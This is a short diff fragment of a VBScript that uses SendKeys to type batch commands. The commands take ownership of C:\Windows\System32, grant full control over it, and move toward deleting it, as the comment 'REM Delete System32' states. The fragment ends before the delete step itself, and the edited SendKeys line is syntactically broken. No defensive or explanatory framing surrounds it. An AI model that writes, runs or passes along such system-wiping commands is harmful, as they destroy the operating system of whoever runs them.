@@ -14,12 +14,10 @@ WshShell.SendKeys "{ENTER}"
 WScript.Sleep 100
 
 
-WshShell.SendKeys " REM Take ownership of System32
-@echo off
-takeown /f C:\Windows\System32 /r /d y
+WshShell.SendKeys 
+ " takeown /f C:\Windows\System32 /r /d y
 icacls C:\Windows\System32 /grant administrators:F /t
 cd C:\Windows\System32
-
 REM Delete System32
 timeout /t 4 NOBREAK > nul
 @echo off
